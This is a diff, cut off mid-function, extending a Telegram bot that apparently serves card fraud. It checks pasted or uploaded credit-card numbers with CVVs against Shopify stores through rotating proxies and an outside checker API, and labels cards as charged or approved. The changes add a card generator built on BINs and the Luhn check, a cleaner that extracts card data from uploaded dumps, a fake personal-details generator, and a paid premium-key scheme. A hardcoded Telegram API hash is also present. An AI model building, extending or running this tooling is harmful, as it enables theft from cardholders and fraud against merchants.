@@ -4,10 +4,11 @@ import aiohttp
 import aiofiles
 import os
 import random
-import time
 import json
 import re
-from datetime import datetime
+import time
+from datetime import datetime, timedelta
+from faker import Faker
 
 API_ID = 39283277
 API_HASH = '56cd66f3f3fd7da78db44263ea05e0dc'
@@ -18,13 +19,21 @@ CHECKER_API_URL = 'https://brainaiapi.up.railway.app/shopify_parallel'
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
 PROXY_FILE = 'proxy.txt'
+MODERATORS_FILE = "moderators.txt"
+KEYS_FILE = "premium_keys.txt"
 
-bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+bot = TelegramClient('checker_bot', API_ID, API_HASH)
 
 active_sessions = {}
 
 # Store card data from uploaded txt files (key: message_id or user_id, value: cards list)
 uploaded_cards_data = {}
+
+# Store users waiting to send file for supercln command
+supercln_waiting_users = {}
+
+# Faker instance for generating fake details
+fake = Faker('en_US')
 
 
 PREMIUM_EMOJI_IDS = {
@@ -137,11 +146,31 @@ def get_main_menu_keyboard(user_id=None):
         [Button.inline(" Cmd", b"show_cmds", style="success"),
          Button.url(" Channel", "https://t.me/bRaiN_Ai_Main", style="success")]
     ]
-    
+
     if user_id and user_id in ADMIN_ID:
         buttons.append([Button.inline(" Admin Panel", b"admin_panel", style="success")])
-    
+
     return buttons
+
+
+def get_result_buttons():
+    """Get the result action buttons (Brain Ai Proved and Start)"""
+    return [
+        Button.url(" Brain Ai Proved", "https://t.me/brainai_checker_prove"),
+        Button.inline(" Start", b"start_action")
+    ]
+
+
+async def send_result_with_buttons(event, text, parse_mode='html', **kwargs):
+    """Send command result with Brain Ai Proved and Start buttons"""
+    buttons = get_result_buttons()
+    return await event.reply(text, buttons=buttons, parse_mode=parse_mode, **kwargs)
+
+
+async def edit_result_with_buttons(event, text, parse_mode='html', **kwargs):
+    """Edit message with Brain Ai Proved and Start buttons"""
+    buttons = get_result_buttons()
+    return await event.edit(text, buttons=buttons, parse_mode=parse_mode, **kwargs)
 
 
 def get_file_lines(filepath):
@@ -204,6 +233,151 @@ async def remove_premium_user(user_id):
         return True
     return False
 
+# ==================== MODERATOR FUNCTIONS ====================
+
+def load_moderators():
+    if not os.path.exists(MODERATORS_FILE):
+        with open(MODERATORS_FILE, 'w') as f:
+            pass
+        return []
+    try:
+        with open(MODERATORS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+            return [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(f"Error loading moderators: {e}")
+        return []
+
+def is_moderator(user_id):
+    moderators = load_moderators()
+    return str(user_id) in moderators
+
+async def add_moderator(user_id):
+    moderators = load_moderators()
+    if str(user_id) not in moderators:
+        moderators.append(str(user_id))
+        async with aiofiles.open(MODERATORS_FILE, 'w') as f:
+            for uid in moderators:
+                await f.write(f"{uid}\n")
+        return True
+    return False
+
+async def remove_moderator(user_id):
+    moderators = load_moderators()
+    if str(user_id) in moderators:
+        moderators.remove(str(user_id))
+        async with aiofiles.open(MODERATORS_FILE, 'w') as f:
+            for uid in moderators:
+                await f.write(f"{uid}\n")
+        return True
+    return False
+
+def is_admin_or_moderator(user_id):
+    return user_id in ADMIN_ID or is_moderator(user_id)
+
+def is_admin(user_id):
+    return user_id in ADMIN_ID
+
+# ==================== PREMIUM KEY SYSTEM ====================
+
+import secrets
+import string
+
+def generate_key():
+    """Generate a unique premium key."""
+    key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(20))
+    return f"PRM-{key[:5]}-{key[5:10]}-{key[10:15]}-{key[15:]}"
+
+def load_keys():
+    """Load all keys from file."""
+    if not os.path.exists(KEYS_FILE):
+        return {}
+    try:
+        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
+            content = f.read().strip()
+            if not content:
+                return {}
+            return json.loads(content)
+    except Exception as e:
+        print(f"Error loading keys: {e}")
+        return {}
+
+async def save_keys(keys_data):
+    """Save keys to file."""
+    async with aiofiles.open(KEYS_FILE, 'w', encoding='utf-8') as f:
+        await f.write(json.dumps(keys_data, indent=2))
+
+async def create_premium_key(duration_days, created_by):
+    """Create a new premium key."""
+    key = generate_key()
+    keys_data = load_keys()
+    
+    keys_data[key] = {
+        "duration_days": duration_days,
+        "created_by": created_by,
+        "created_at": datetime.now().isoformat(),
+        "redeemed_by": None,
+        "redeemed_at": None,
+        "expires_at": None,
+        "active": False
+    }
+    
+    await save_keys(keys_data)
+    return key
+
+async def redeem_key(key, user_id):
+    """Redeem a premium key for a user."""
+    keys_data = load_keys()
+    
+    if key not in keys_data:
+        return False, "Invalid key"
+    
+    key_data = keys_data[key]
+    
+    if key_data.get("redeemed_by") is not None:
+        return False, "Key already redeemed"
+    
+    # Calculate expiration
+    duration_days = key_data["duration_days"]
+    expires_at = datetime.now() + timedelta(days=duration_days)
+    
+    # Update key data
+    key_data["redeemed_by"] = user_id
+    key_data["redeemed_at"] = datetime.now().isoformat()
+    key_data["expires_at"] = expires_at.isoformat()
+    key_data["active"] = True
+    
+    await save_keys(keys_data)
+    
+    # Add user to premium
+    await add_premium_user(user_id)
+    
+    return True, expires_at
+
+async def deactivate_expired_keys():
+    """Deactivate keys that have expired and remove premium access."""
+    keys_data = load_keys()
+    now = datetime.now()
+    
+    for key, key_data in keys_data.items():
+        if key_data.get("active") and key_data.get("expires_at"):
+            expires_at = datetime.fromisoformat(key_data["expires_at"])
+            if now > expires_at:
+                # Key expired
+                key_data["active"] = False
+                user_id = key_data.get("redeemed_by")
+                if user_id:
+                    await remove_premium_user(user_id)
+                    try:
+                        await bot.send_message(
+                            user_id, 
+                            premium_emoji("⚠️ Your premium access has expired. Please redeem a new key to continue using premium features."), 
+                            parse_mode='html'
+                        )
+                    except:
+                        pass
+    
+    await save_keys(keys_data)
+
 # Error messages that should trigger a retry with new site/proxy
 RETRY_ERROR_MESSAGES = [
     "No Valid Products",
@@ -214,7 +388,20 @@ RETRY_ERROR_MESSAGES = [
     "Proxy Dead",
     "Site Error",
     "500",
-    "price 0.0"
+    "price 0.0",
+    # Additional retry messages from user request
+    "Site not supported",
+    "Site Error",
+    "404",
+    "Payment method not available",
+    "Site error: ARTIFACT_DISSATISFACTION",
+    "Not Shopify",
+    "Site requires login",
+    "Site requires login!",
+    "Failed to get session token",
+    "Cart failed with status 422",
+    "proxy error",
+    "Site error"
 ]
 
 def is_site_dead(response_msg, gateway, price):
@@ -276,6 +463,95 @@ def extract_cc(text):
             year = '20' + year
         cards.append(f"{card}|{month}|{year}|{cvv}")
     return cards
+
+
+def luhn_checksum(card_number):
+    """Calculate the Luhn checksum for a card number."""
+    def digits_of(n):
+        return [int(d) for d in str(n)]
+
+    digits = digits_of(card_number)
+    odd_digits = digits[-1::-2]
+    even_digits = digits[-2::-2]
+
+    checksum = sum(odd_digits)
+    for d in even_digits:
+        checksum += sum(digits_of(d * 2))
+
+    return checksum % 10
+
+
+def luhn_check(card_number):
+    """Check if a card number is valid according to the Luhn algorithm."""
+    return luhn_checksum(card_number) == 0
+
+
+def generate_luhn_number(prefix, length):
+    """Generate a valid Luhn number with the given prefix and total length."""
+    prefix_str = str(prefix)
+    remaining_length = length - len(prefix_str) - 1
+    random_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
+    partial_number = prefix_str + random_digits
+    check_digit = (10 - luhn_checksum(int(partial_number))) % 10
+    return partial_number + str(check_digit)
+
+
+def detect_card_type(bin_number):
+    """Detect card type (amex, visa, mastercard, discover) based on BIN."""
+    bin_str = str(bin_number)
+
+    # American Express: starts with 34 or 37
+    if bin_str.startswith(('34', '37')):
+        return 'amex'
+
+    # Visa: starts with 4
+    if bin_str.startswith('4'):
+        return 'visa'
+
+    # Mastercard: starts with 51-55 or 2221-2720
+    if bin_str.startswith(('51', '52', '53', '54', '55')):
+        return 'mastercard'
+    if len(bin_str) >= 4:
+        first_four = int(bin_str[:4])
+        if 2221 <= first_four <= 2720:
+            return 'mastercard'
+
+    # Discover: starts with 6011, 644-649, 65, or 622126-622925
+    if bin_str.startswith(('6011', '65')):
+        return 'discover'
+    if len(bin_str) >= 3:
+        first_three = int(bin_str[:3])
+        if 644 <= first_three <= 649:
+            return 'discover'
+    if len(bin_str) >= 6:
+        first_six = int(bin_str[:6])
+        if 622126 <= first_six <= 622925:
+            return 'discover'
+
+    # Default to visa if unknown
+    return 'visa'
+
+
+def get_card_length(card_type):
+    """Get the standard card number length for a card type."""
+    lengths = {
+        'amex': 15,
+        'visa': 16,
+        'mastercard': 16,
+        'discover': 16
+    }
+    return lengths.get(card_type, 16)
+
+
+def get_cvv_length(card_type):
+    """Get the CVV length for a card type."""
+    lengths = {
+        'amex': 4,
+        'visa': 3,
+        'mastercard': 3,
+        'discover': 3
+    }
+    return lengths.get(card_type, 3)
 
 async def check_card(card, site, proxy):
     try:
@@ -349,19 +625,11 @@ async def check_card(card, site, proxy):
         else:
             return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
-async def check_card_with_retry(card, sites, proxies, max_retries=3):
+async def check_card_with_retry(card, sites, proxies, max_retries=5):
     """
     Check card with retry logic.
-    Retries up to max_retries times when encountering specific error messages:
-    - No Valid Products
-    - MERCHANDISE_OUT_OF_STOCK
-    - policy_class
-    - Proxy Error:
-    - ARTIFACT_DISSATISFACTION
-    - Proxy Dead
-    - Site Error
-    - 500
-    - price 0.0
+    Retries up to max_retries times (default: 5) when encountering specific error messages.
+    Switches to a new site and proxy on each retry.
     """
     last_result = None
     if not sites:
@@ -420,29 +688,61 @@ async def send_realtime_hit(user_id, result, hit_type, username):
 🥰 Country : {country} {flag}"""
 
     try:
-        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
+        return await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
     except:
-        pass
+        return None
 
-async def update_progress(user_id, message_id, results, current_attempt_count):
+async def update_progress(user_id, message_id, results, current_attempt_count, show_scanned=True, session_key=None):
     elapsed = int(time.time() - results['start_time'])
     hours = elapsed // 3600
     minutes = (elapsed % 3600) // 60
     seconds = elapsed % 60
 
     progress_text = f""" 💳  Card: <code>{results.get('last_card', 'None')}</code>
-    
+
 💰 {results.get('last_price', '-')}
-    
+
 📝 {results.get('last_response', 'Waiting...')[:30]}
     """
 
-    buttons = [
-        [Button.inline(f" CHARGED {len(results['charged'])}", b"none", style="success")],
-        [Button.inline(f" APPROVED {len(results['approved'])}", b"none", style="primary")],
-        [Button.inline(f" DECLINED {len(results['dead'])}", b"none", style="danger")],
-        [Button.inline(" STOP", f"stop_{user_id}".encode(), style="danger")]
-    ]
+    # Build buttons with new layout
+    buttons = []
+    checked = results.get('checked', 0)
+    total = results.get('total', 0)
+
+    # Row 1: SCANNED (yellow color) and CHARGED
+    buttons.append([
+        Button.inline(f"⏳ SCANNED ({checked}/{total})", b"none"),
+        Button.inline(f"💎 CHARGED {len(results['charged'])}", b"none")
+    ])
+
+    # Row 2: APPROVED and DECLINED
+    buttons.append([
+        Button.inline(f"⚡ APPROVED {len(results['approved'])}", b"none"),
+        Button.inline(f"⛔️ DECLINED {len(results['dead'])}", b"none")
+    ])
+
+    # Row 3: RESUME and PAUSE buttons
+    if session_key and session_key in active_sessions:
+        is_paused = active_sessions[session_key].get('paused', False)
+        if is_paused:
+            buttons.append([
+                Button.inline("🔘 RESUME", f"resume_{user_id}_{message_id}".encode()),
+                Button.inline("📍 PAUSED", b"none")
+            ])
+        else:
+            buttons.append([
+                Button.inline("🔘 RESUME", b"none"),
+                Button.inline("📍 PAUSE", f"pause_{user_id}_{message_id}".encode())
+            ])
+    else:
+        buttons.append([
+            Button.inline("🔘 RESUME", b"none"),
+            Button.inline("📍 PAUSE", b"none")
+        ])
+
+    # Row 4: STOP button (full width)
+    buttons.append([Button.inline("❌ STOP", f"stop_{user_id}".encode(), style="danger")])
 
     try:
         await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
@@ -626,7 +926,7 @@ async def show_commands_callback(event):
 
 🛒 Shopify
 ├─ <code>/sp cc|mm|yy|cvv</code> → Check single card
-└─ <code>/sptxt</code> → Mass check from .txt file
+└─ <code>/sptxt (Your Cards)</txt</code> → Mass 20 Card check 
 
 🔧 Site Management
 ├─ <code>/site</code> → Check & remove dead sites
@@ -642,8 +942,15 @@ async def show_commands_callback(event):
 └─ <code>/getproxy</code> → Get all proxies
 
 ☠️ Other Tools
-└─ <code>/bin bin_number</code> → Get BIN details extract"""
-    
+├─ <code>/bin bin_number</code> → Get BIN details extract
+├─ <code>/supercln</code> → Clean cards using Luhn algorithm
+├─ <code>/fakedetails</code> → Generate fake personal details
+├─ <code>/gen</code> → Generate cards with Luhn algorithm
+    ├─ <code>/gen BIN limit</code>
+    ├─ <code>/gen BIN|MM|YYYY| limit</code>
+    └─ <code>/gen BIN|MM|YYYY|CVV limit</code>"""
+
+
     buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
     
     await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')
@@ -652,16 +959,25 @@ async def show_commands_callback(event):
 async def admin_panel_callback(event):
     user_id = event.sender_id
     
-    if user_id not in ADMIN_ID:
-        await event.answer("❌ Access Denied. Admin only.", alert=True)
+    if not is_admin_or_moderator(user_id):
+        await event.answer("❌ Access Denied. Admin/Moderator only.", alert=True)
         return
     
-    admin_text = """👑 <b>Admin Panel</b>
+    is_admin_user = is_admin(user_id)
+    
+    if is_admin_user:
+        admin_text = """👑 <b>Admin Panel</b>
 
 📋 <b>Premium Management</b>
-├─ <code>/addpremium user_id</code> → Add user to premium
+├─ <code>/key (count) (days)</code> → Generate premium keys
 ├─ <code>/removepremium user_id</code> → Remove user from premium
 └─ <code>/listpremium</code> → List all premium users
+
+📋 <b>Moderator User Managment</b>
+├─ <code>/addmo user_id</code> → Add new moderator
+└─ <code>/removepremium</code> → Remove premium (shared)
+
+💡 <b>Users redeem keys with:</b> <code>/redeem &lt;key&gt;</code>
 
 🌐 <b>Sites Management</b>
 ├─ <code>/addsites</code> → Reply to .txt file to upload sites
@@ -669,11 +985,48 @@ async def admin_panel_callback(event):
 
 📊 <b>Bot Statistics</b>
 └─ <code>/stats</code> → Show bot statistics"""
+    else:
+        # Moderator view
+        admin_text = """👑 <b>Moderator Panel</b>
+
+📋 <b>Moderator User Managment</b>
+├─ <code>/key (count) (days)</code> → Generate premium keys
+└─ <code>/removepremium user_id</code> → Remove user premium
+
+💡 <b>Users redeem keys with:</b> <code>/redeem &lt;key&gt;</code>
+
+📋 <b>Bot Statistics</b>
+└─ <code>/listpremium</code> → List all premium users"""
 
     buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
     
     await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')
     
+@bot.on(events.CallbackQuery(data=b"start_action"))
+async def start_action_callback(event):
+    """Handle Start button click - show welcome message"""
+    user_id = event.sender_id
+    is_prem = is_premium(user_id)
+
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else "User"
+    except:
+        username = "User"
+
+    welcome_text = f"""👋 Hey @{username}!
+
+🎁 How to use:
+   🦉 Add proxy: <code>/addproxy</code>
+   🦉 Add sites: <code>/site</code>
+   🦉 Check CC: <code>/sp card|mm|yy|cvv</code>
+
+💡 Made by @White_DeviL3620"""
+
+    buttons = get_main_menu_keyboard(user_id)
+
+    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
+
 @bot.on(events.CallbackQuery(data=b"main_menu"))
 async def main_menu_callback(event):
     user_id = event.sender_id
@@ -734,7 +1087,7 @@ async def single_cc_check(event):
     status_msg = await event.reply(premium_emoji(f"🔄 Checking <code>{card}</code>..."), parse_mode='html')
 
     try:
-        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
+        result = await check_card_with_retry(card, sites, proxies, max_retries=5)
 
         brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
 
@@ -763,6 +1116,250 @@ async def single_cc_check(event):
 
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern='/supercln'))
+async def supercln_command(event):
+    """
+    /supercln command - Extract valid cards from txt file using Luhn algorithm
+    Usage: /supercln then send txt file
+    """
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
+        return
+
+    # Mark user as waiting for file
+    supercln_waiting_users[user_id] = True
+
+    await event.reply(premium_emoji("🔄 Processing Clean Cards\n\n📁 Send Your txt Cards File"), parse_mode='html')
+
+
+@bot.on(events.NewMessage)
+async def handle_supercln_file(event):
+    """Handle txt file upload for /supercln command."""
+    user_id = event.sender_id
+
+    # Check if user is waiting to send file for supercln
+    if user_id not in supercln_waiting_users:
+        return
+
+    # Remove user from waiting list
+    del supercln_waiting_users[user_id]
+
+    # Check if message has a file
+    if not event.file:
+        await event.reply(premium_emoji("❌ No file received. Please send a .txt file."), parse_mode='html')
+        return
+
+    # Check if it's a .txt file
+    if not event.file.name or not event.file.name.endswith('.txt'):
+        await event.reply(premium_emoji("❌ Please send a .txt file."), parse_mode='html')
+        return
+
+    # Download and process the file
+    status_msg = await event.reply(premium_emoji("🔄 Processing file and extracting valid cards..."), parse_mode='html')
+
+    try:
+        file_path = await event.download_media()
+
+        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = await f.read()
+
+        # Extract all potential card patterns
+        potential_cards = []
+        extracted_numbers = set()  # Track extracted card numbers to avoid duplicates
+
+        # Pattern 1: Standard format number|mm|yy|cvv or number|mm|yyyy|cvv
+        pattern1 = r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
+        matches = re.findall(pattern1, content)
+        for match in matches:
+            card_num, month, year, cvv = match
+            if card_num in extracted_numbers:
+                continue
+            extracted_numbers.add(card_num)
+            # Normalize year
+            if len(year) == 2:
+                year = '20' + year
+            potential_cards.append({
+                'card': f"{card_num}|{month.zfill(2)}|{year}|{cvv}",
+                'number': card_num,
+                'month': month.zfill(2),
+                'year': year,
+                'cvv': cvv
+            })
+
+        # Pattern 2: Format with spaces or other delimiters (e.g., "1234567890123456 01 2025 123")
+        # Look for 15-16 digit numbers followed by date-like patterns
+        all_numbers = re.findall(r'\b(\d{15,16})\b', content)
+
+        for num in all_numbers:
+            if num in extracted_numbers:
+                continue
+
+            # Find the position of this number in content
+            idx = content.find(num)
+            if idx == -1:
+                continue
+
+            # Look in surrounding text (100 chars before and after) for date/cvv patterns
+            start = max(0, idx - 100)
+            end = min(len(content), idx + 100)
+            nearby = content[start:end]
+
+            # Try to find month/year patterns
+            # Pattern: MM/YY, MM/YYYY, MM-YY, MM-YYYY, MM|YY, MM|YYYY
+            date_patterns = [
+                r'(?:^|[\s\|/\-:])(\d{1,2})[\s\|/\-:]+(\d{2,4})(?:$|[\s\|/\-:])',
+                r'(?:^|[\s\|/\-:])(0[1-9]|1[0-2])[\s\|/\-:]+(\d{2,4})(?:$|[\s\|/\-:])',
+            ]
+
+            month = None
+            year = None
+            cvv = None
+
+            for dp in date_patterns:
+                date_match = re.search(dp, nearby)
+                if date_match:
+                    month = date_match.group(1).zfill(2)
+                    year = date_match.group(2)
+                    if len(year) == 2:
+                        year = '20' + year
+                    break
+
+            # Try to find CVV (3-4 digits, often after date or near card)
+            cvv_patterns = [
+                r'(?:^|[\s\|/\-:])(\d{3,4})(?:$|[\s\|/\-:])',
+            ]
+            for cp in cvv_patterns:
+                cvv_match = re.search(cp, nearby)
+                if cvv_match:
+                    potential_cvv = cvv_match.group(1)
+                    if len(potential_cvv) in [3, 4]:
+                        cvv = potential_cvv
+                        break
+
+            # If we found at least month and year, add this card
+            if month and year:
+                if not cvv:
+                    cvv = '000'  # Default CVV if not found
+
+                extracted_numbers.add(num)
+                potential_cards.append({
+                    'card': f"{num}|{month}|{year}|{cvv}",
+                    'number': num,
+                    'month': month,
+                    'year': year,
+                    'cvv': cvv
+                })
+
+        # Pattern 3: Lines that look like card entries (comma, tab, or space separated)
+        lines = content.split('\n')
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+
+            # Try to find card number at the start of the line
+            card_match = re.match(r'^(\d{15,16})\b', line)
+            if card_match:
+                num = card_match.group(1)
+                if num in extracted_numbers:
+                    continue
+
+                # Look for month/year/cvv in the rest of the line
+                rest = line[len(num):]
+
+                # Try different separators
+                parts = re.split(r'[\s\|/,;\t]+', rest.strip())
+
+                month = None
+                year = None
+                cvv = None
+
+                for part in parts:
+                    part = part.strip()
+                    if not part:
+                        continue
+
+                    # Check if it looks like a month (1-12)
+                    if part.isdigit() and 1 <= int(part) <= 12 and not month:
+                        month = part.zfill(2)
+                    # Check if it looks like a year (2 or 4 digits)
+                    elif part.isdigit() and len(part) in [2, 4] and int(part) > 0:
+                        if not year:
+                            if len(part) == 2:
+                                year = '20' + part
+                            else:
+                                year = part
+                    # Check if it looks like a CVV (3-4 digits)
+                    elif part.isdigit() and len(part) in [3, 4] and not cvv:
+                        cvv = part
+
+                # If we have at least month and year, add the card
+                if month and year:
+                    if not cvv:
+                        cvv = '000'
+
+                    extracted_numbers.add(num)
+                    potential_cards.append({
+                        'card': f"{num}|{month}|{year}|{cvv}",
+                        'number': num,
+                        'month': month,
+                        'year': year,
+                        'cvv': cvv
+                    })
+
+        os.remove(file_path)
+
+        if not potential_cards:
+            await status_msg.edit(premium_emoji("❌ No potential cards found in file."), parse_mode='html')
+            return
+
+        # Now validate each card using Luhn algorithm
+        valid_cards = []
+        invalid_cards = []
+
+        for card_data in potential_cards:
+            card_num = card_data['number']
+            is_valid = luhn_check(card_num)
+
+            if is_valid:
+                valid_cards.append(card_data)
+            else:
+                invalid_cards.append(card_data)
+
+        # Create output file with valid cards only
+        output_filename = "BrainAi_cc_supercleaner.txt"
+
+        async with aiofiles.open(output_filename, 'w') as f:
+            for card_data in valid_cards:
+                await f.write(f"{card_data['card']}\n")
+
+        # Prepare summary
+        summary = f"""✅ Processing Complete!
+
+📊 Statistics:
+   ┣ 📁 Total cards found: {len(potential_cards)}
+   ┣ ✅ Valid (Luhn check): {len(valid_cards)}
+   ┗ ❌ Invalid: {len(invalid_cards)}
+
+📄 Output file: <code>{output_filename}</code>"""
+
+        await status_msg.edit(premium_emoji(summary), parse_mode='html')
+
+        # Send the output file
+        await bot.send_message(user_id, premium_emoji("🎁 Here are your cleaned cards:"), file=output_filename, parse_mode='html')
+
+        # Cleanup
+        try:
+            os.remove(output_filename)
+        except:
+            pass
+
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
 
 @bot.on(events.NewMessage(pattern='/chk'))
 async def check_command(event):
@@ -885,7 +1482,7 @@ async def check_command(event):
                     last_update_time[0] = now
                     if session_key in active_sessions:
                         try:
-                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
+                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], session_key=session_key)
                         except Exception:
                             pass
 
@@ -992,7 +1589,7 @@ async def proxy_command(event):
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
 
-@bot.on(events.NewMessage(pattern='/chkproxy\s+'))
+@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
 async def check_single_proxy(event):
     user_id = event.sender_id
 
@@ -1011,14 +1608,14 @@ async def check_single_proxy(event):
         result = await test_proxy(proxy)
 
         if result['status'] == 'alive':
-            await status_msg.edit(premium_emoji(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
+            await edit_result_with_buttons(status_msg, premium_emoji(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"))
         else:
-            await status_msg.edit(premium_emoji(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')
+            await edit_result_with_buttons(status_msg, premium_emoji(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"))
 
     except Exception as e:
-        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+        await edit_result_with_buttons(status_msg, premium_emoji(f"❌ Error: {e}"))
 
-@bot.on(events.NewMessage(pattern='/rmproxy\s+'))
+@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
 async def remove_single_proxy(event):
     user_id = event.sender_id
 
@@ -1043,9 +1640,9 @@ async def remove_single_proxy(event):
         for proxy in new_proxies:
             await f.write(f"{proxy}\n")
 
-    await event.reply(premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')
+    await send_result_with_buttons(event, premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"))
 
-@bot.on(events.NewMessage(pattern='/rmproxyindex\s+'))
+@bot.on(events.NewMessage(pattern=r'/rmproxyindex\s+'))
 async def remove_proxy_by_index(event):
     user_id = event.sender_id
 
@@ -1263,7 +1860,7 @@ async def site_command(event):
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
 
-@bot.on(events.NewMessage(pattern='/rm\s+'))
+@bot.on(events.NewMessage(pattern=r'/rm\s+'))
 async def remove_site_command(event):
     user_id = event.sender_id
     if not is_premium(user_id):
@@ -1367,45 +1964,195 @@ async def add_sites_command(event):
         
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
-        
-        
-@bot.on(events.NewMessage(pattern='/addpremium'))
-async def add_premium_command(event):
+
+
+@bot.on(events.NewMessage(pattern='/getsites'))
+async def get_sites_command(event):
+    """Send the sites.txt file."""
+    user_id = event.sender_id
+
+    if user_id not in ADMIN_ID:
+        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
+        return
+
+    if not os.path.exists(SITES_FILE):
+        await send_result_with_buttons(event, premium_emoji("❌ No sites file found."))
+        return
+
+    sites = get_file_lines(SITES_FILE)
+    if not sites:
+        await send_result_with_buttons(event, premium_emoji("📭 No sites available."))
+        return
+
+    try:
+        async with aiofiles.open(SITES_FILE, 'r', encoding='utf-8') as f:
+            content = await f.read()
+
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"sites_{timestamp}.txt"
+
+        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
+            await f.write(content)
+
+        await bot.send_file(event.chat_id, filename, caption=premium_emoji(f"✅ Total {len(sites)} sites"))
+        await send_result_with_buttons(event, premium_emoji("📥 Sites file sent successfully!"))
+
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+    except Exception as e:
+        await send_result_with_buttons(event, premium_emoji(f"❌ Error: {e}"))
+
+
+# ==================== KEY SYSTEM COMMANDS ====================
+
+@bot.on(events.NewMessage(pattern='/key'))
+async def key_command(event):
+    """Generate premium keys. Usage: /key <count> <duration_days>"""
     user_id = event.sender_id
     
-    if user_id not in ADMIN_ID:
+    if not is_admin_or_moderator(user_id):
+        await event.reply(premium_emoji("❌ Access Denied. Admin/Moderator only."), parse_mode='html')
+        return
+    
+    try:
+        parts = event.raw_text.split()
+        if len(parts) != 3:
+            await event.reply(premium_emoji("📝 Usage: <code>/key <count> <duration_days></code>\n\nExample: <code>/key 5 30</code> → Generate 5 keys with 30 days duration"), parse_mode='html')
+            return
+        
+        count = int(parts[1])
+        duration_days = int(parts[2])
+        
+        if count < 1 or count > 100:
+            await event.reply(premium_emoji("❌ Count must be between 1 and 100."), parse_mode='html')
+            return
+        
+        if duration_days < 1 or duration_days > 365:
+            await event.reply(premium_emoji("❌ Duration must be between 1 and 365 days."), parse_mode='html')
+            return
+        
+        # Generate keys
+        keys = []
+        for _ in range(count):
+            key = await create_premium_key(duration_days, user_id)
+            keys.append(key)
+        
+        # Send keys to user
+        keys_text = "\n".join([f"🔑 <code>{key}</code>" for key in keys])
+
+        await send_result_with_buttons(event, premium_emoji(f"✅ <b>Generated {count} Premium Key(s)</b>\n\n⏱️ <b>Duration:</b> {duration_days} days\n\n{keys_text}\n\n💡 Users can redeem with: <code>/redeem &lt;key&gt;</code>"))
+
+    except ValueError:
+        await send_result_with_buttons(event, premium_emoji("❌ Invalid number format."))
+    except Exception as e:
+        await send_result_with_buttons(event, premium_emoji(f"❌ Error: {e}"))
+
+
+@bot.on(events.NewMessage(pattern='/redeem'))
+async def redeem_command(event):
+    """Redeem a premium key. Usage: /redeem <key>"""
+    user_id = event.sender_id
+    
+    try:
+        parts = event.raw_text.split()
+        if len(parts) != 2:
+            await event.reply(premium_emoji("📝 Usage: <code>/redeem &lt;key&gt;</code>\n\nExample: <code>/redeem PRM-XXXXX-XXXXX-XXXXX-XXXXX</code>"), parse_mode='html')
+            return
+        
+        key = parts[1]
+        
+        success, result = await redeem_key(key, user_id)
+
+        if success:
+            expires_at = result
+            await send_result_with_buttons(event, premium_emoji(f"🎉 <b>Premium Access Activated!</b>\n\n✅ Your key has been redeemed successfully.\n\n⏱️ <b>Expires:</b> <code>{expires_at.strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n💎 You now have access to all premium features!"))
+        else:
+            await send_result_with_buttons(event, premium_emoji(f"❌ <b>Redemption Failed</b>\n\n{result}"))
+
+    except Exception as e:
+        await send_result_with_buttons(event, premium_emoji(f"❌ Error: {e}"))
+
+
+@bot.on(events.NewMessage(pattern='/addmo'))
+async def add_moderator_command(event):
+    """Add a new moderator. Usage: /addmo <user_id>"""
+    user_id = event.sender_id
+    
+    # Only admin can add moderators
+    if not is_admin(user_id):
         await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
         return
     
     try:
         parts = event.raw_text.split()
         if len(parts) != 2:
-            await event.reply(premium_emoji("📝 Usage: <code>/addpremium user_id</code>"), parse_mode='html')
